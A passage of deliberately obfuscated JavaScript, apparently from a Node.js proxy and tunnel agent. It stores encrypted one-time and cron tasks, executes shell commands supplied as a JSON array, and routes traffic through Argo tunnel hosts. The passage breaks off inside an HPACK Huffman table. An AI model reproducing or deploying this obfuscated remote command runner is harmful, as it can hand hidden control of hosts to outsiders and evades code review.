            const h = Array[gU(0xedd)](g['onetasks']) ? g[gU(0x1b9)]['map'](String) : [], i = {};
            for (const [m, n] of Object['entries'](g[gU(0x69c)] || {}))
                i[a[gU(0x34d)](String, m)] = String(n);
            b[gU(0x838)] = (Array[gU(0xedd)](g[gU(0x838)]) ? g[gU(0x838)] : [])[gU(0x595)](o => o && typeof o[gU(0x73d)] === gU(0xba0) && typeof o[gU(0xebe)] === 'string')['map'](o => ({
                'hub': o[gU(0x73d)],
                'kname': o[gU(0xebe)],
                'ports': Array[gU(0xedd)](o[gU(0xfea)]) ? o[gU(0xfea)]['filter'](q => Number[gU(0x63f)](q) && q >= 0x1 && q <= 0xffff) : []
            }));
            const j = o => (Array[gU(0xedd)](o) ? o : [])[gU(0x595)](q => Number[gU(0x63f)](q) && q >= 0x1 && q <= 0xffff);
            return g[gU(0xa6d)] && !Array[gU(0xedd)](g['proxyports']) ? b[gU(0xa6d)] = {
                'hub': a[gU(0x34d)](j, g['proxyports'][gU(0x73d)]),
                'local': a[gU(0x34d)](j, g[gU(0xa6d)][gU(0x95a)])
            } : b[gU(0xa6d)] = {
                'hub': [],
                'local': a[gU(0x34d)](j, g[gU(0xa6d)])
            }, b[gU(0xd44)] = (Array[gU(0xedd)](g[gU(0xd44)]) ? g[gU(0xd44)] : [])['filter'](o => o && typeof o[gU(0x94b)] === 'string' && o[gU(0x94b)] && Number[gU(0x63f)](o[gU(0x5c6)]) && o['port'] >= 0x1 && o[gU(0x5c6)] <= 0xffff)[gU(0xf2e)](o => {
                const gV = gU, p = {
                        'port': o[gV(0x5c6)],
                        'name': o[gV(0x94b)]
                    };
                if (a[gV(0xcbb)](typeof o[gV(0x525)], a['KcZjN']) && o[gV(0x525)])
                    p[gV(0x525)] = o[gV(0x525)];
                return p;
            }), a0R[gU(0x543)](gU(0x6b1)[gU(0x83f)](h[gU(0xc54)], ',\x20cron=')[gU(0x83f)](Object[gU(0xfa8)](i)[gU(0xc54)], gU(0xc99))['concat'](b[gU(0x838)][gU(0xc54)], gU(0xbbd))['concat'](b[gU(0xa6d)][gU(0x73d)]['length'], gU(0x7bd))[gU(0x83f)](b['proxyports']['local'][gU(0xc54)], gU(0x5f7))[gU(0x83f)](b[gU(0xd44)][gU(0xc54)])), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (o) {
            return a0aW[gU(0x405)]('加载失败:\x20'[gU(0x83f)](o[gU(0x769)])), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static [a0d9(0xa13)]() {
        const gW = a0d9;
        return [...a0aW[gW(0xc3e)][gW(0x838)] || []];
    }
    static [a0d9(0xab8)](a) {
        const gX = a0d9, b = a0aW[gX(0xc3e)];
        if (!b[gX(0x105c)] || b['locked'])
            return ![];
        return b[gX(0x838)] = (a || [])['filter'](c => c && c[gX(0x73d)] && c['kname'])[gX(0xf2e)](c => ({
            'hub': String(c[gX(0x73d)]),
            'kname': String(c[gX(0xebe)]),
            'ports': (c[gX(0xfea)] || [])[gX(0x595)](d => Number['isInteger'](d) && d >= 0x1 && d <= 0xffff)
        })), a0aW[gX(0xdc5)](a0aE['onetasks'], a0aE[gX(0x69c)]);
    }
    static [a0d9(0x103d)]() {
        const gY = a0d9, a = a0aW[gY(0xc3e)]['proxyports'] || {};
        return {
            'hub': [...a[gY(0x73d)] || []],
            'local': [...a[gY(0x95a)] || []]
        };
    }
    static [a0d9(0x6bf)](a) {
        const gZ = a0d9, b = {
                'auSwS': function (f, g) {
                    return f === g;
                },
                'PkRIG': function (f, g) {
                    return f(g);
                },
                'NMwEC': function (f, g) {
                    return f > g;
                },
                'paGwE': function (f, g) {
                    return f(g);
                },
                'vepSH': function (f, g) {
                    return f(g);
                }
            }, c = a0aW[gZ(0xc3e)];
        if (!c[gZ(0x105c)] || c[gZ(0x96f)])
            return ![];
        const d = f => {
            const h0 = gZ, g = new Set();
            for (const h of f || []) {
                if (b[h0(0xbde)](typeof h, 'boolean'))
                    continue;
                const i = b[h0(0x3b2)](Number, h);
                if (!Number[h0(0x63f)](i) || i < 0x1 || b[h0(0x105e)](i, 0xffff))
                    continue;
                g[h0(0xbcd)](i);
            }
            return [...g][h0(0xcd4)]((j, k) => j - k);
        };
        return c[gZ(0xa6d)] = a && !Array[gZ(0xedd)](a) ? {
            'hub': b['paGwE'](d, a[gZ(0x73d)]),
            'local': b[gZ(0x2c2)](d, a[gZ(0x95a)])
        } : {
            'hub': [],
            'local': b[gZ(0x29d)](d, a)
        }, a0aW['save'](a0aE[gZ(0x1b9)], a0aE[gZ(0x69c)]);
    }
    static [a0d9(0x9ef)]() {
        const h1 = a0d9;
        return (a0aW['state'][h1(0xd44)] || [])['map'](a => ({ ...a }));
    }
    static ['saveArgobinds'](a) {
        const h2 = a0d9, b = {
                'zBHCP': function (d, f) {
                    return d(f);
                },
                'DfsDQ': function (d, f) {
                    return d === f;
                },
                'zFQVV': h2(0xba0),
                'jnfVJ': function (d, f) {
                    return d(f);
                }
            }, c = a0aW[h2(0xc3e)];
        if (!c['enabled'] || c[h2(0x96f)])
            return ![];
        return c[h2(0xd44)] = (a || [])[h2(0x595)](d => d && d['name'] && Number[h2(0x63f)](d[h2(0x5c6)]) && d[h2(0x5c6)] >= 0x1 && d[h2(0x5c6)] <= 0xffff)[h2(0xf2e)](d => {
            const h3 = h2, f = {
                    'port': d['port'],
                    'name': b[h3(0x2eb)](String, d[h3(0x94b)])
                };
            if (b['DfsDQ'](typeof d[h3(0x525)], b[h3(0xd71)]) && d[h3(0x525)])
                f[h3(0x525)] = b[h3(0x7a5)](String, d[h3(0x525)]);
            return f;
        }), a0aW[h2(0xdc5)](a0aE[h2(0x1b9)], a0aE['crontasks']);
    }
    static ['quarantine'](a) {
        const h4 = a0d9;
        try {
            const b = a0aW[h4(0xc3e)];
            if (b[h4(0x4fa)] && a0l[h4(0x8de)](b[h4(0x4fa)])) {
                const c = ''['concat'](b[h4(0x4fa)], h4(0x299))[h4(0x83f)](Date['now']());
                a0l[h4(0xd6b)](b['path'], c), a0R[h4(0xfcc)](h4(0x55c)['concat'](a, ',\x20原文件已隔离:\x20')[h4(0x83f)](c));
            } else
                a0R[h4(0xfcc)]('[TaskStore]\x20❌\x20'[h4(0x83f)](a));
        } catch (d) {
            a0R['error']('[TaskStore]\x20❌\x20'[h4(0x83f)](a, h4(0xf64))[h4(0x83f)](d[h4(0x769)]));
        }
    }
    static ['save'](a, b) {
        const h5 = a0d9, c = a0aW[h5(0xc3e)];
        if (!c[h5(0x105c)] || c[h5(0x96f)])
            return ![];
        let d = null;
        try {
            const f = {
                    'magic': a0aW[h5(0x38e)],
                    'version': a0aW[h5(0x997)],
                    'saved_at': new Date()[h5(0xc78)]()[h5(0x8d4)](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {},
                        'hubregs': c[h5(0x838)] || [],
                        'argobinds': c[h5(0xd44)] || [],
                        'proxyports': c[h5(0xa6d)] || {
                            'hub': [],
                            'local': []
                        }
                    }
                }, g = a0aW['encrypt'](c[h5(0x525)], JSON[h5(0x41c)](f));
            return a0l['mkdirSync'](a0o[h5(0x7e4)](c[h5(0x4fa)]), { 'recursive': !![] }), d = ''[h5(0x83f)](c['path'], h5(0x6e2))['concat'](process['pid']), a0l[h5(0x571)](d, g, h5(0xec2)), a0l[h5(0xd6b)](d, c[h5(0x4fa)]), c['lastSavedAt'] = f[h5(0x22c)], !![];
        } catch (h) {
            a0R['error']('[TaskStore]\x20❌\x20保存失败\x20(内存任务不受影响):\x20'[h5(0x83f)](h[h5(0x769)]));
            try {
                if (d && a0l[h5(0x8de)](d))
                    a0l[h5(0xbbc)](d);
            } catch (i) {
            }
            return ![];
        }
    }
}
class a0aX {
    static [a0d9(0x605)] = new Map();
    static [a0d9(0x75c)](a, b) {
        const h6 = a0d9, c = {
                'mJKMe': function (d, f) {
                    return d > f;
                },
                'rQLmE': function (d, f) {
                    return d - f;
                }
            };
        a[h6(0xb66)](b), c[h6(0xc82)](a[h6(0xc54)], a0aE[h6(0x591)]) && a[h6(0x8ee)](0x0, c['rQLmE'](a['length'], a0aE[h6(0x591)]));
    }
    static [a0d9(0xdff)](a, b, c, d, f = null) {
        const h7 = a0d9, g = new Date()[h7(0xc78)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': ''[h7(0x83f)](g, h7(0xf90))[h7(0x83f)](a, '\x20----\x20exitcode=')[h7(0x83f)](c, '\x0a')['concat'](b?.[h7(0x5b0)]() || '')
        };
    }
    static [a0d9(0x5cc)]() {
        const h8 = a0d9;
        return {
            'status': 'ok',
            'count': a0aE[h8(0x1b9)]['length'],
            'tasks': a0aE[h8(0x1b9)]
        };
    }
    static [a0d9(0xb40)] = /^\s*(?:#|rem\b)\s*kisama-task:\s*(.*)$/i;
    static [a0d9(0xb15)](a) {
        const h9 = a0d9, b = {
                'YJCMh': function (d, f) {
                    return d ?? f;
                },
                'ownZv': function (d, f) {
                    return d(f);
                }
            }, c = String(b[h9(0xb50)](a, ''))['split']('\x0a')[h9(0x47b)](0x0, 0x3);
        for (const d of c) {
            const f = a0aX['taskMetaLineRe'][h9(0x31e)](d);
            if (!f)
                continue;
            const g = /\bid=(\d+)\b/['exec'](f[0x1])?.[0x1];
            if (!g)
                return null;
            const h = b[h9(0xc9e)](Number, /\bupdated=(\d+)\b/['exec'](f[0x1])?.[0x1] || 0x0);
            return {
                'id': g,
                'updated': h
            };
        }
        return null;
    }
    static [a0d9(0xe8d)](a) {
        const ha = a0d9, b = {
                'GVPvI': function (d, f) {
                    return d ?? f;
                },
                'uRFgZ': function (d, f) {
                    return d < f;
                },
                'LtnBi': function (d, f) {
                    return d + f;
                },
                'DkREQ': function (d, f) {
                    return d(f);
                }
            }, c = String(b[ha(0xd41)](a, ''))[ha(0xa6a)]('\x0a');
        for (let d = 0x0; b[ha(0x75e)](d, Math['min'](0x3, c[ha(0xc54)])); d++) {
            if (a0aX[ha(0xb40)][ha(0xf92)](c[d]))
                return [
                    ...c['slice'](0x0, d),
                    ...c['slice'](b[ha(0xdf8)](d, 0x1))
                ]['join']('\x0a');
        }
        return b[ha(0x5bb)](String, b[ha(0xd41)](a, ''));
    }
    static [a0d9(0x99f)](a, b, c) {
        const hb = a0d9, d = {
                'uHhxA': function (j, k) {
                    return j === k;
                },
                'yLUmT': hb(0xd3b),
                'adjsT': 'rem'
            }, f = a0aX[hb(0xe8d)](a), g = d[hb(0x404)](process['platform'], d[hb(0x79f)]) ? d[hb(0x1b7)] : '#', h = ''[hb(0x83f)](g, hb(0x1066))[hb(0x83f)](b, hb(0x987))[hb(0x83f)](c), i = f[hb(0xa6a)]('\x0a');
        return i['splice'](i[0x0]?.[hb(0x1ba)]('#!') ? 0x1 : 0x0, 0x0, h), i[hb(0xd9d)]('\x0a');
    }
    static [a0d9(0x267)](a, b) {
        const hc = a0d9, c = {
                'raGWK': function (j, k) {
                    return j(k);
                },
                'GEIZU': function (j, k) {
                    return j < k;
                },
                'wOPCP': function (j, k) {
                    return j(k);
                }
            }, d = Date[hc(0x8da)](), f = j => (j || [])[hc(0xf2e)](k => ({
                'raw': String(k ?? ''),
                'meta': a0aX['parseTaskMeta'](k),
                'eff': a0aX['stripTaskMetaLine'](k)[hc(0x5b0)]()
            })), g = c[hc(0x102f)](f, b), h = new Set(), i = [];
        for (const {
                    raw: j,
                    meta: k,
                    eff: l
                } of f(a)) {
            let m = -0x1;
            k && (m = g[hc(0x217)]((p, q) => !h[hc(0xe1a)](q) && p[hc(0x40e)] && p['meta']['id'] === k['id']));
            m < 0x0 && (m = g[hc(0x217)]((p, q) => !h[hc(0xe1a)](q) && p['eff'] === l && (!k || !p[hc(0x40e)])));
            if (c[hc(0x488)](m, 0x0)) {
                i[hc(0xb66)](a0aX['withTaskMeta'](l, c[hc(0x102f)](String, d), d));
                continue;
            }
            const n = g[m];
            h[hc(0xbcd)](m);
            if (n['eff'] === l) {
                n['meta'] ? i[hc(0xb66)](a0aX[hc(0x99f)](n[hc(0x2a5)], n[hc(0x40e)]['id'], n['meta']['updated'])) : i[hc(0xb66)](a0aX[hc(0x99f)](n[hc(0x2a5)], k ? k['id'] : c['wOPCP'](String, d), k && k[hc(0xdcd)] ? k[hc(0xdcd)] : d));
                continue;
            }
            const o = n['meta'] ? n['meta']['id'] : k ? k['id'] : String(d);
            i[hc(0xb66)](a0aX[hc(0x99f)](l, o, d));
        }
        return i;
    }
    static [a0d9(0xa0d)](a, b) {
        const hd = a0d9, c = {
                'jPYyj': function (j, k) {
                    return j < k;
                },
                'tspOx': function (j, k) {
                    return j < k;
                },
                'KFcST': function (j, k) {
                    return j === k;
                },
                'KgbeD': function (j, k) {
                    return j(k);
                }
            }, d = Date[hd(0x8da)](), f = ([j, k]) => ({
                'expr': String(j),
                'raw': String(k ?? ''),
                'meta': a0aX['parseTaskMeta'](k),
                'eff': a0aX['stripTaskMetaLine'](k)['trim']()
            }), g = Object[hd(0x77e)](b || {})[hd(0xf2e)](f), h = new Set(), i = {};
        for (const {
                    expr: j,
                    raw: k,
                    meta: l,
                    eff: m
                } of Object[hd(0x77e)](a || {})[hd(0xf2e)](f)) {
            let n = -0x1;
            l && (n = g[hd(0x217)]((q, r) => !h[hd(0xe1a)](r) && q[hd(0x40e)] && q[hd(0x40e)]['id'] === l['id']));
            c[hd(0xa9a)](n, 0x0) && (n = g['findIndex']((q, r) => !h[hd(0xe1a)](r) && q[hd(0x2c8)] === j && q[hd(0xaa1)] === m && (!l || !q['meta'])));
            if (c['tspOx'](n, 0x0)) {
                i[j] = a0aX[hd(0x99f)](m, String(d), d);
                continue;
            }
            const o = g[n];
            h[hd(0xbcd)](n);
            if (c[hd(0xd57)](o[hd(0xaa1)], m) && c['KFcST'](o[hd(0x2c8)], j)) {
                o[hd(0x40e)] ? i[j] = a0aX[hd(0x99f)](o['raw'], o[hd(0x40e)]['id'], o[hd(0x40e)]['updated']) : i[j] = a0aX[hd(0x99f)](o[hd(0x2a5)], l ? l['id'] : String(d), l && l[hd(0xdcd)] ? l[hd(0xdcd)] : d);
                continue;
            }
            const p = o[hd(0x40e)] ? o[hd(0x40e)]['id'] : l ? l['id'] : c[hd(0x1052)](String, d);
            i[j] = a0aX[hd(0x99f)](m, p, d);
        }
        return i;
    }
    static async [a0d9(0xbc1)](a) {
        const he = a0d9, b = {
                'SxYbs': function (d, f) {
                    return d > f;
                },
                'mLaVl': function (d, f) {
                    return d < f;
                },
                'RdZQi': 'onetime'
            };
        if (!Array[he(0xedd)](a)) {
            const d = new Error('请求体必须是\x20JSON\x20字符串数组\x20(如\x20[\x22cmd1\x22,\x22cmd2\x22])');
            d[he(0x13d)] = 0x190;
            throw d;
        }
        a0aE['onetasks'] = a && a[he(0xc54)] > 0x0 ? a0aX[he(0x267)](a, a0aE[he(0x1b9)]) : [];
        const c = [];
        if (a0aE['InitTask'] && b[he(0xc5d)](a0aE[he(0x1b9)]['length'], 0x0)) {
            for (let f = 0x0; b['mLaVl'](f, a0aE[he(0x1b9)][he(0xc54)]); f++) {
                const g = a0aE[he(0x1b9)][f], h = await a0aQ[he(0xd97)](g), j = this[he(0xdff)](g, h['result'], h[he(0x536)], b[he(0xa1c)]);
                this['_appendLog'](a0aE[he(0xd32)], j), c['push']({
                    'index': f,
                    'cmd': g,
                    'exitcode': h[he(0x536)],
                    'output': h[he(0x1009)],
                    'status': h['exitcode'] === 0x0 ? 'ok' : he(0xfcc)
                });
            }
            a0aE[he(0x4b8)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0aE['onetasks'][he(0xc54)],
            'tasks': a0aE[he(0x1b9)],
            'executed': c,
            'persisted': a0aW[he(0xdc5)](a0aE['onetasks'], a0aE[he(0x69c)])
        };
    }
    static [a0d9(0x845)]() {
        const hf = a0d9;
        return {
            'status': 'ok',
            'count': Object[hf(0xfa8)](a0aE['crontasks'])[hf(0xc54)],
            'tasks': a0aE[hf(0x69c)]
        };
    }
    static [a0d9(0x182)](a) {
        const hg = a0d9, b = {
                'RXzvT': hg(0xd40),
                'DJwVp': function (d, f) {
                    return d === f;
                },
                'kHSaq': 'cron',
                'VmTLx': function (d, f) {
                    return d > f;
                },
                'RjiEW': hg(0xfcc),
                'JxKKi': function (d, f) {
                    return d - f;
                }
            };
        this[hg(0x605)]['forEach'](d => {
            const hh = hg;
            typeof d[hh(0xe73)] === b[hh(0x4e8)] && d[hh(0xe73)](), b[hh(0x2af)](typeof d['destroy'], hh(0xd40)) && d[hh(0x28a)]();
        }), this[hg(0x605)][hg(0x3bb)]();
        const c = [];
        for (const d of Object[hg(0xfa8)](a || {})) {
            !a0t[hg(0x416)](d) && c[hg(0xb66)](d);
        }
        if (b[hg(0x2ff)](c[hg(0xc54)], 0x0))
            return {
                'status': b['RjiEW'],
                'message': hg(0x7af)[hg(0x83f)](c[hg(0xd9d)](',\x20')),
                'valid_count': b[hg(0xecc)](Object[hg(0xfa8)](a || {})[hg(0xc54)], c[hg(0xc54)])
            };
        a0aE[hg(0x69c)] = a && b[hg(0x2ff)](Object[hg(0xfa8)](a)[hg(0xc54)], 0x0) ? a0aX[hg(0xa0d)](a, a0aE[hg(0x69c)]) : {};
        for (const [f, g] of Object[hg(0x77e)](a0aE['crontasks'])) {
            const h = a0t['schedule'](f, async () => {
                const hi = hg, i = await a0aQ[hi(0xd97)](g), j = this[hi(0xdff)](g, i['result'], i[hi(0x536)], b['kHSaq'], f);
                this[hi(0x75c)](a0aE['crontasks_log'], j);
            });
            this['cronJobs'][hg(0x42d)](f, h);
        }
        return a0aE[hg(0xdad)] = Object[hg(0xfa8)](a0aE[hg(0x69c)])['length'] > 0x0, {
            'status': 'ok',
            'count': Object[hg(0xfa8)](a0aE[hg(0x69c)])[hg(0xc54)],
            'tasks': a0aE[hg(0x69c)],
            'persisted': a0aW[hg(0xdc5)](a0aE[hg(0x1b9)], a0aE['crontasks'])
        };
    }
    static [a0d9(0x554)]() {
        const hj = a0d9;
        return {
            'onetime': {
                'pending': a0aE[hj(0x4b8)],
                'count': a0aE[hj(0x1b9)]['length']
            },
            'cron': {
                'active': a0aE[hj(0xdad)],
                'count': Object[hj(0xfa8)](a0aE[hj(0x69c)])[hj(0xc54)],
                'check_interval': a0aE['CRON_CHECK_INTERVAL']
            },
            'persistence': {
                'enabled': a0aW['state'][hj(0x105c)],
                'store_path': a0aW['state'][hj(0x4fa)],
                'last_saved_at': a0aW[hj(0xc3e)][hj(0xd5e)]
            }
        };
    }
    static [a0d9(0x4c1)](a = 0x32) {
        const hk = a0d9, b = a0aE[hk(0xd32)][hk(0x47b)](-a);
        return {
            'status': 'ok',
            'count': b[hk(0xc54)],
            'logs': b
        };
    }
    static [a0d9(0xc06)](a = 0x32) {
        const hl = a0d9, b = a0aE[hl(0x690)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[hl(0xc54)],
            'logs': b
        };
    }
    static [a0d9(0x3ff)]() {
        const hm = a0d9, a = { 'PTnBc': hm(0x3ef) }, b = a0aE['onetimetasks_log'][hm(0xc54)];
        return a0aE[hm(0xd32)] = [], {
            'status': 'ok',
            'cleared': a[hm(0xe68)]
        };
    }
    static ['clearCronLogs']() {
        const hn = a0d9, a = { 'pmGjH': hn(0xddf) }, b = a0aE[hn(0x690)]['length'];
        return a0aE[hn(0x690)] = [], {
            'status': 'ok',
            'cleared': a[hn(0x991)]
        };
    }
    static [a0d9(0xa86)]() {
        const ho = a0d9, a = {
                'LMTcd': function (g, h) {
                    return g - h;
                },
                'ULzyg': function (g, h) {
                    return g - h;
                }
            }, b = a0aE[ho(0xd32)][ho(0x595)](g => g[ho(0x536)] === 0x0)[ho(0xc54)], c = a[ho(0x9c6)](a0aE['onetimetasks_log'][ho(0xc54)], b), d = a0aE[ho(0x690)][ho(0x595)](g => g['exitcode'] === 0x0)[ho(0xc54)], f = a['ULzyg'](a0aE['crontasks_log']['length'], d);
        return {
            'onetime': {
                'total_logged': a0aE[ho(0xd32)][ho(0xc54)],
                'max_capacity': a0aE[ho(0x591)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0aE[ho(0x690)][ho(0xc54)],
                'max_capacity': a0aE[ho(0x591)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const hp = a0d9, a = {
                'HcXyV': function (c, d) {
                    return c < d;
                },
                'odSvc': hp(0x3ef)
            }, b = [];
        for (let c = 0x0; a['HcXyV'](c, a0aE['onetasks'][hp(0xc54)]); c++) {
            const d = a0aE[hp(0x1b9)][c], f = await a0aQ['execute'](d), g = this[hp(0xdff)](d, f[hp(0x1009)], f[hp(0x536)], a[hp(0x93e)]);
            this[hp(0x75c)](a0aE[hp(0xd32)], g), b['push']({
                'cmd': d,
                'exitcode': f[hp(0x536)],
                'output': f[hp(0x1009)],
                'timeout': f[hp(0x7e0)]
            });
        }
        return a0aE[hp(0x4b8)] = ![], {
            'status': 'ok',
            'executed': b[hp(0xc54)],
            'results': b
        };
    }
    static [a0d9(0x7f8)]() {
        const hq = a0d9, a = {
                'gvBvI': function (c, d) {
                    return c > d;
                }
            };
        a0aW[hq(0xd4d)]();
        const b = a0aW[hq(0xe75)]();
        b[hq(0x1b9)][hq(0xc54)] > 0x0 && (a0aE[hq(0x1b9)] = b[hq(0x1b9)]);
        if (Object[hq(0xfa8)](b[hq(0x69c)])[hq(0xc54)] > 0x0)
            try {
                a0aX['setCronTasks'](b[hq(0x69c)]);
            } catch (c) {
                a0R[hq(0xfcc)](hq(0x7f5)[hq(0x83f)](c[hq(0x769)]));
            }
        a[hq(0xf2f)](a0aE[hq(0x1b9)][hq(0xc54)], 0x0) && a0aE[hq(0x4b8)] && a0aX[hq(0x493)]()[hq(0x92f)](d => a0R[hq(0xfcc)](hq(0xd27)[hq(0x83f)](d[hq(0x769)])));
    }
}
const a0aY = a0d9(0x2ac), a0aZ = ((() => {
        const hr = a0d9, a = {
                'XxTOo': function (c, d) {
                    return c > d;
                },
                'AeSdq': hr(0x88d)
            }, b = String(process.env.KISAMA_EDGE_HOSTS || '')['split'](',')[hr(0xf2e)](c => c[hr(0x5b0)]())['filter'](Boolean);
        return a['XxTOo'](b[hr(0xc54)], 0x0) ? b : [
            a[hr(0xd09)],
            'region2.v2.argotunnel.com'
        ];
    })()), a0b0 = 0x1ea4, a0b1 = a0d9(0x1ca), a0b2 = 'control-stream', a0b3 = 0x4000, a0b4 = [
        [
            a0d9(0x5d2),
            ''
        ],
        [
            a0d9(0x364),
            a0d9(0x249)
        ],
        [
            a0d9(0x364),
            a0d9(0xe14)
        ],
        [
            a0d9(0xf69),
            '/'
        ],
        [
            a0d9(0xf69),
            a0d9(0xa46)
        ],
        [
            a0d9(0x514),
            a0d9(0x13a)
        ],
        [
            ':scheme',
            a0d9(0xda4)
        ],
        [
            ':status',
            a0d9(0x6ab)
        ],
        [
            ':status',
            '204'
        ],
        [
            a0d9(0x8c8),
            a0d9(0x268)
        ],
        [
            a0d9(0x8c8),
            a0d9(0xb8c)
        ],
        [
            a0d9(0x8c8),
            a0d9(0x765)
        ],
        [
            a0d9(0x8c8),
            a0d9(0xc92)
        ],
        [
            a0d9(0x8c8),
            a0d9(0x9e0)
        ],
        [
            a0d9(0x684),
            ''
        ],
        [
            a0d9(0x559),
            a0d9(0x256)
        ],
        [
            a0d9(0x33c),
            ''
        ],
        [
            a0d9(0x749),
            ''
        ],
        [
            a0d9(0x85a),
            ''
        ],
        [
            a0d9(0xc6b),
            ''
        ],
        [
            a0d9(0x1de),
            ''
        ],
        [
            a0d9(0x36b),
            ''
        ],
        [
            a0d9(0xa69),
            ''
        ],
        [
            a0d9(0x28c),
            ''
        ],
        [
            a0d9(0xc0b),
            ''
        ],
        [
            a0d9(0x18c),
            ''
        ],
        [
            'content-language',
            ''
        ],
        [
            a0d9(0x8b6),
            ''
        ],
        [
            a0d9(0x456),
            ''
        ],
        [
            a0d9(0xcec),
            ''
        ],
        [
            a0d9(0x374),
            ''
        ],
        [
            a0d9(0x105b),
            ''
        ],
        [
            'date',
            ''
        ],
        [
            'etag',
            ''
        ],
        [
            a0d9(0xcdb),
            ''
        ],
        [
            'expires',
            ''
        ],
        [
            a0d9(0xca5),
            ''
        ],
        [
            'host',
            ''
        ],
        [
            a0d9(0x7ee),
            ''
        ],
        [
            a0d9(0x952),
            ''
        ],
        [
            a0d9(0x73a),
            ''
        ],
        [
            a0d9(0xe63),
            ''
        ],
        [
            a0d9(0xac5),
            ''
        ],
        [
            a0d9(0xd1c),
            ''
        ],
        [
            a0d9(0xfd6),
            ''
        ],
        [
            'location',
            ''
        ],
        [
            'max-forwards',
            ''
        ],
        [
            a0d9(0xb28),
            ''
        ],
        [
            'proxy-authorization',
            ''
        ],
        [
            a0d9(0x37e),
            ''
        ],
        [
            a0d9(0x4d0),
            ''
        ],
        [
            a0d9(0x6c8),
            ''
        ],
        [
            a0d9(0xb6a),
            ''
        ],
        [
            a0d9(0x779),
            ''
        ],
        [
            a0d9(0x94c),
            ''
        ],
        [
            a0d9(0x4d1),
            ''
        ],
        [
            a0d9(0x6c4),
            ''
        ],
        [
            a0d9(0xbeb),
            ''
        ],
        [
            'vary',
            ''
        ],
        [
            a0d9(0xa39),
            ''
        ],
        [
            a0d9(0xbc0),
            ''
        ]
    ], a0b5 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
